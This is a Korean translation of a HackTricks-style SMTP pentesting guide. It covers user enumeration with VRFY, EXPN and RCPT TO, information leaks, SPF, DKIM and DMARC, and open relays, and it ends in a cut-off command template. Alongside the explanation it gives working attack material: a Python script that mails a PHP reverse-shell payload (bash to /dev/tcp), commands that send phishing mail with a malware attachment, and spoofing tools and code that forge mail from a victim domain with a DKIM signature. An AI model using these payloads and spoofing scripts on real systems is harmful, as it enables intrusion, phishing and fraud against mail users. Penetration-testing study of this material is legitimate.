# 25,465,587 - SMTP/s 펜테스팅

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team 전문가)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 요령을 공유하고 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 기여하세요.**

</details>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 펜테스팅을 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행하십시오. 이러한 기능은 정찰부터 보고서 작성까지 이어집니다. 우리는 펜테스터를 대체하지 않습니다 - 대신 사용자에게 깊이 파고들고 쉘을 열고 즐길 시간을 돌려주기 위해 사용자 정의 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

## **기본 정보**

**간단한 메일 전송 프로토콜 (SMTP)**은 **이메일의 송수신**을 위해 TCP/IP 스위트 내에서 사용되는 프로토콜입니다. 수신자 측에서 메시지를 대기열에 보관하는 데 제한이 있기 때문에 SMTP는 종종 **POP3 또는 IMAP**과 함께 사용됩니다. 이러한 추가 프로토콜을 사용하면 사용자가 서버 메일함에 메시지를 저장하고 주기적으로 다운로드할 수 있습니다.

실제로 **이메일 프로그램**이 **이메일을 보내기 위해 SMTP를 사용**하고 **받기 위해 POP3 또는 IMAP를 사용**하는 것이 일반적입니다. Unix 기반 시스템에서는 이메일 용으로 가장 자주 사용되는 SMTP 서버로 **sendmail**이 두드러집니다. 상용 패키지인 Sendmail에는 POP3 서버가 포함되어 있습니다. 또한 **Microsoft Exchange**는 SMTP 서버를 제공하며 POP3 지원을 포함할 수 있습니다.

**기본 포트:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### 이메일 헤더

만약 피해자로부터 이메일을 받을 기회가 있다면 (예: 웹 페이지의 연락처 양식을 통해), 그 이유로 **피해자의 내부 토폴로지에 대해 알 수 있기 때문에** 이를 이용하세요.

또한, 존재하지 않는 주소로 이메일을 보내려는 SMTP 서버로부터 이메일을 받을 수도 있습니다 (서버는 공격자에게 NDN 메일을 보냅니다). 그러나, 허용된 주소에서 이메일을 보내는지 확인하십시오 (SPF 정책을 확인) 그리고 NDN 메시지를 받을 수 있는지 확인하십시오.

더 흥미로운 정보를 찾을 수 있기 때문에 **다른 내용을 보내보는 것이 좋습니다**. 헤더에 `X-Virus-Scanned: by av.domain.com`과 같은 정보가 있을 수 있습니다.\
EICAR 테스트 파일을 보내야 합니다.\
**AV**를 감지하면 **알려진 취약점을 악용**할 수 있습니다.

## 기본 작업

### **배너 그랩핑/기본 연결**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:  

**SMTPS**는 SMTP의 보안 버전으로, 일반적으로 465번 포트를 사용합니다. SMTPS는 SSL/TLS를 사용하여 통신을 암호화하고 인증합니다. SMTPS를 사용하면 데이터가 안전하게 전송되므로 중요한 이메일 통신에 적합합니다.
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 조직의 MX 서버 찾기
```bash
dig +short mx google.com
```
### 열거
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM 인증 - 정보 노출

서버가 NTLM 인증 (Windows)을 지원하는 경우 민감한 정보 (버전)를 얻을 수 있습니다. 자세한 정보는 [여기](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)에서 확인할 수 있습니다.
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
또는 **nmap** 플러그인 `smtp-ntlm-info.nse`로 **자동화**할 수 있습니다.

### 내부 서버 이름 - 정보 노출

일부 SMTP 서버는 전체 주소 없이 "MAIL FROM" 명령이 발행될 때 발신자 주소를 자동으로 완성하여 내부 이름을 노출합니다:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### 스니핑

패킷에서 포트 25로부터 일부 비밀번호를 스니핑하는지 확인하세요.

### [인증 브루트포스](../../generic-methodologies-and-resources/brute-force.md#smtp)

## 사용자명 브루트포스 열거

**항상 인증이 필요한 것은 아닙니다**.

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY 명령은 SMTP(Simple Mail Transfer Protocol) 서버에서 사용자의 존재 여부를 확인하는 데 사용됩니다. 이 명령은 보안 취약점으로 이어질 수 있으므로 대부분의 SMTP 서버에서 비활성화되어 있습니다.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN

### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 자동 도구
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행할 수 있습니다. 우리는 펜테스터를 대체하지 않습니다 - 대신 사용자에게 깊이 파고들고 쉘을 열고 즐길 시간을 돌려주기 위해 맞춤형 도구, 탐지 및 악용 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

## DSN 보고서

**배달 상태 통지 보고서**: 조직에게 **유효하지 않은 주소**로 **이메일**을 보내면, 조직은 해당 주소가 유효하지 않았음을 알리고 **당신에게 다시 메일을 보내**서 알려줍니다. 반환된 이메일의 **헤더**에는 가능한 **민감한 정보**가 포함될 수 있습니다(예: 보고서와 상호 작용하는 메일 서비스의 IP 주소 또는 안티바이러스 소프트웨어 정보).

## [Commands](smtp-commands.md)

### 리눅스 콘솔에서 이메일 보내기
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Python을 사용하여 이메일 보내기

<details>

<summary>Python 코드 여기에</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP 스머글링

SMTP 스머글링 취약점은 모든 SMTP 보호 기능을 우회할 수 있게 했습니다 (보호 기능에 대한 자세한 내용은 다음 섹션을 참조하세요). SMTP 스머글링에 대한 자세한 내용은 확인하세요:

{% content-ref url="smtp-smuggling.md" %}
[smtp-smuggling.md](smtp-smuggling.md)
{% endcontent-ref %}

## 메일 위조 대책

**SPF**, **DKIM**, 및 **DMARC**를 사용하여 조직은 SMTP 메시지를 위조하기 쉬운 점을 고려하여 권한 없이 이메일을 발송하는 것을 방지합니다.

이러한 대책에 대한 **상세 가이드**는 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)에서 제공됩니다.

### SPF

{% hint style="danger" %}
2014년에 [SPF가 "폐기"되었습니다](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). 이는 `_spf.domain.com`에 **TXT 레코드**를 생성하는 대신 `domain.com`에 **동일한 구문**을 사용하여 생성해야 함을 의미합니다.\
또한, 이전 SPF 레코드를 재사용하기 위해 `"v=spf1 include:_spf.google.com ~all"`과 같은 내용을 자주 찾을 수 있습니다.
{% endhint %}

**발신자 정책 프레임워크** (SPF)는 메일 전송 에이전트(MTAs)가 조직에서 정의한 인증된 메일 서버 목록을 쿼리하여 이메일을 보내는 호스트가 인가되었는지 확인할 수 있는 메커니즘입니다. 이 목록은 IP 주소/범위, 도메인 및 기타 엔티티를 명시하여 **도메인 이름을 대표하여 이메일을 보낼 수 있는 권한이 있는** 다양한 "**메커니즘**"을 SPF 레코드에 포함합니다.

#### 메커니즘

[Wikipedia](https://en.wikipedia.org/wiki/Sender\_Policy\_Framework)에서:

| 메커니즘 | 설명                                                                                                                                                                                                                                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 항상 일치; 모든 이전 메커니즘에 일치하지 않는 모든 IP에 대한 `-all`과 같은 기본 결과에 사용됨.                                                                                                                                                                                                                                  |
| A         | 도메인 이름이 발신자 주소로 해석될 수 있는 주소 레코드 (A 또는 AAAA)가 있는 경우 일치함.                                                                                                                                                                                                                   |
| IP4       | 발신자가 특정 IPv4 주소 범위에 있는 경우 일치함.                                                                                                                                                                                                                                                                              |
| IP6       | 발신자가 특정 IPv6 주소 범위에 있는 경우 일치함.                                                                                                                                                                                                                                                                              |
| MX        | 도메인 이름이 발신자 주소로 해석되는 MX 레코드가 있는 경우 일치함 (즉, 메일이 도메인의 수신 메일 서버 중 하나에서 온 것임).                                                                                                                                                                          |
| PTR       | 클라이언트 주소에 대한 도메인 이름 (PTR 레코드)이 주어진 도메인에 있고 해당 도메인 이름이 클라이언트 주소로 해석되는 경우 (전방 확인된 역방향 DNS), 일치함. 이 메커니즘은 권장되지 않으며 가능한 경우 피해야 함.                                                                                     |
| EXISTS    | 주어진 도메인 이름이 어떤 주소로든 해석되면 일치함 (해석되는 주소에 관계없이). 이것은 드물게 사용됨. SPF 매크로 언어와 함께 사용하면 DNSBL-쿼리와 같은 더 복잡한 일치를 제공함.                                                                                                                           |
| INCLUDE   | 다른 도메인의 정책을 참조함. 해당 도메인의 정책이 통과하면 이 메커니즘도 통과함. 그러나 포함된 정책이 실패하는 경우 처리가 계속됨. 다른 도메인의 정책을 완전히 위임하려면 리디렉션 확장을 사용해야 함.                                                                                     |
| REDIRECT  | <p>리디렉션은 SPF 정책을 호스팅하는 다른 도메인 이름을 가리키는 포인터로, 여러 도메인이 동일한 SPF 정책을 공유할 수 있게 함. 동일한 이메일 인프라를 공유하는 많은 도메인과 작업할 때 유용함.</p><p>리디렉션 메커니즘에 지정된 도메인의 SPF 정책이 사용됨.</p> |

**메커니즘이 일치하는 경우 어떻게 처리해야 하는지를 나타내는 **퀄리파이어**를 식별하는 것도 가능합니다. 기본적으로 **퀄리파이어 "+"**가 사용됩니다 (따라서 어떤 메커니즘이 일치하더라도 허용됨).\
일반적으로 **각 SPF 정책의 끝에** 다음과 같은 내용을 찾을 수 있습니다: **\~all** 또는 **-all**. 이는 **발신자가 어떤 SPF 정책과도 일치하지 않는 경우, 이메일을 신뢰할 수 없는 것으로 표시 (\~)하거나 이메일을 거부 (-)해야 함을 나타냅니다.**

#### 퀄리파이어

정책 내의 각 메커니즘은 의도된 결과를 정의하기 위해 네 가지 퀄리파이어 중 하나로 접두어를 붙일 수 있습니다:

* **`+`**: PASS 결과에 해당합니다. 기본적으로 메커니즘은 이 퀄리파이어를 가정하며, `+mx`가 `mx`와 동일하게 만듭니다.
* **`?`**: NEUTRAL 결과를 나타내며, 특정 정책이 없는 경우와 유사하게 처리됩니다.
* **`~`**: SOFTFAIL을 나타내며, NEUTRAL과 FAIL 사이의 중간 지점 역할을 합니다. 이 결과를 만족하는 이메일은 일반적으로 수락되지만 그에 따라 표시됩니다.
* **`-`**: FAIL을 나타내며, 이메일을 완전히 거부해야 함을 제안합니다.

다음 예제에서는 **google.com의 SPF 정책**이 설명되어 있습니다. 첫 번째 SPF 정책 내에서 다른 도메인의 SPF 정책을 포함하는 것에 주목하세요:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
전통적으로는 올바른/아무 SPF 레코드가 없는 도메인 이름을 위조하는 것이 가능했습니다. **현재는**, **유효한 SPF 레코드가 없는 도메인에서 이메일이 온 경우** 자동으로 **거부/신뢰되지 않는 것으로 표시될 가능성**이 높습니다.

도메인의 SPF를 확인하려면 다음과 같은 온라인 도구를 사용할 수 있습니다: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (도메인키 식별 메일)

DKIM은 발신 이메일에 서명하여 외부 메일 전송 에이전트(MTAs)가 해당 도메인의 공개 키를 DNS에서 검색하여 유효성을 확인할 수 있도록 하는 데 사용됩니다. 이 공개 키는 도메인의 TXT 레코드에 위치합니다. 이 키에 액세스하려면 셀렉터와 도메인 이름을 알아야 합니다.

예를 들어, 키를 요청하려면 도메인 이름과 셀렉터가 필수적입니다. 이 정보는 메일 헤더 `DKIM-Signature`에서 찾을 수 있습니다. 예: `d=gmail.com;s=20120113`.

이 정보를 가져오기 위한 명령어는 다음과 같을 수 있습니다:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (도메인 기반 메시지 인증, 보고 및 준수)

DMARC는 SPF 및 DKIM 프로토콜을 기반으로 이메일 보안을 강화합니다. 특정 도메인에서의 이메일 처리에 대한 정책을 개요로 제시하며, 인증 실패 처리 방법 및 이메일 처리 작업에 대한 보고를 어디로 보낼지에 대해 메일 서버를 안내합니다.

**DMARC 레코드를 얻으려면 \_dmarc 하위 도메인을 쿼리해야 합니다**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 태그

| 태그 이름 | 목적                                         | 샘플                           |
| -------- | -------------------------------------------- | ------------------------------ |
| v        | 프로토콜 버전                                 | v=DMARC1                      |
| pct      | 필터링 대상 메시지의 백분율                   | pct=20                        |
| ruf      | 포렌식 보고를 위한 보고 URI                  | ruf=mailto:authfail@example.com |
| rua      | 집계 보고를 위한 보고 URI                   | rua=mailto:aggrep@example.com |
| p        | 조직 도메인 정책                            | p=quarantine                  |
| sp       | OD의 하위 도메인 정책                       | sp=reject                     |
| adkim    | DKIM의 정렬 모드                            | adkim=s                       |
| aspf     | SPF의 정렬 모드                             | aspf=r                        |

### **하위 도메인은 어떻게 되나요?**

**여기**에서 확인하세요.\
메일을 보내려는 각 하위 도메인마다 별도의 SPF 레코드가 필요합니다.\
다음 내용은 원래 openspf.org에 게시된 것으로, 이러한 유형의 정보에 대한 좋은 자료원이었던 곳입니다.

> 악마 질문: 하위 도메인은 어떻게 되나요?
>
> pielovers.demon.co.uk에서 메일을 받았는데, pielovers에 대한 SPF 데이터가 없다면, demon.co.uk의 SPF를 테스트해야 할까요? 아니요. Demon의 각 하위 도메인은 다른 고객이며, 각 고객은 자체 정책을 가질 수 있습니다. Demon의 정책이 기본적으로 모든 고객에 적용되는 것은 의미가 없습니다. Demon이 그렇게 하려면 각 하위 도메인에 대해 SPF 레코드를 설정할 수 있습니다.
>
> 따라서 SPF 발행자에 대한 권고 사항은 다음과 같습니다: A 또는 MX 레코드가 있는 각 하위 도메인 또는 호스트 이름에 SPF 레코드를 추가해야 합니다.
>
> 와일드카드 A 또는 MX 레코드가 있는 사이트는 다음과 같은 형식의 와일드카드 SPF 레코드도 가져야 합니다: \* IN TXT "v=spf1 -all"

이것은 합리적입니다 - 하위 도메인은 매우 다른 지리적 위치에 있을 수 있으며 매우 다른 SPF 정의를 가질 수 있습니다.

### **오픈 릴레이**

이메일을 보낼 때 스팸으로 표시되지 않도록 하는 것은 매우 중요합니다. 이는 주로 수신자가 신뢰하는 **릴레이 서버를 통해** 달성됩니다. 그러나 일반적인 도전 과제는 관리자가 허용해야 하는 **안전한 IP 범위를 완전히 인식하지 못할 수도** 있다는 것입니다. 이러한 이해 부족은 SMTP 서버 설정에서 실수를 유발할 수 있으며, 이는 보안 평가에서 자주 발견되는 위험입니다.

일부 관리자가 이메일 전달 문제를 피하기 위해 특히 잠재적 또는 진행 중인 클라이언트와의 통신과 관련된 문제를 피하기 위해 사용하는 해결책은 **모든 IP 주소에서의 연결을 허용**하는 것입니다. 이는 SMTP 서버의 `mynetworks` 매개변수를 모든 IP 주소를 허용하도록 구성하여 수행됩니다.
```bash
mynetworks = 0.0.0.0/0
```
다음은 메일 서버가 오픈 릴레이인지 확인하는 데 사용되는 `nmap` 도구에 대한 내용입니다. 이는 외부 소스에서 이메일을 전달할 수 있는 서버를 의미합니다. 이를 테스트하기 위해 특정 스크립트가 포함된 `nmap` 도구가 일반적으로 사용됩니다. `nmap`를 사용하여 특정 서버(예: IP 10.10.10.10)의 포트 25에서 상세 스캔을 수행하는 명령어는 다음과 같습니다:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **도구**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF 및 DMARC 구성 오류 확인**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **자동으로 SPF 및 DMARC 구성 가져오기**

### 이메일 위조 보내기

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**또는 도구를 사용할 수 있습니다:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
dkim python 라이브러리를 사용할 때 **오류가 발생하는 경우** 다음 키를 사용해도 괜찮습니다.\
**참고**: 이것은 openssl 개인 키가 dkim에 의해 **구문 분석되지 않는 경우**에 빠른 확인을 수행하기 위한 더러운 수정이라는 점을 유의하십시오.
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**또는 수동으로 수행할 수도 있습니다:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># 이것은 서명되지 않은 메시지를 보냅니다
</strong><strong>mail("your_email@gmail.com", "테스트 제목!", "안녕하세요! 이것은 테스트입니다", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **추가 정보**

**이러한 보호 기능에 대한 자세한 정보는** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **에서 찾을 수 있습니다.**

### **기타 사기 피싱 지표**

* 도메인 연령
* IP 주소를 가리키는 링크
* 링크 조작 기술
* 수상한 (일반적이지 않은) 첨부 파일
* 이메일 콘텐츠 손상
* 메일 헤더와 다른 값 사용
* 유효하고 신뢰할 수 있는 SSL 인증서의 존재
* 웹 콘텐츠 필터링 사이트에 페이지 제출

## SMTP를 통한 유출

**SMTP를 통해 데이터를 전송할 수 있다면** [**여기를 읽어보세요**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## 구성 파일

### 포스트픽스

일반적으로, `/etc/postfix/master.cf`에는 사용자가 새 이메일을 수신할 때 실행할 **스크립트가 포함**되어 있습니다. 예를 들어, `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`라는 줄은 사용자 mark가 새 이메일을 수신할 때 `/etc/postfix/filtering`이 실행됨을 의미합니다.

다른 구성 파일:
```
sendmail.cf
submit.cf
```
## 참고 자료

* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/)
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
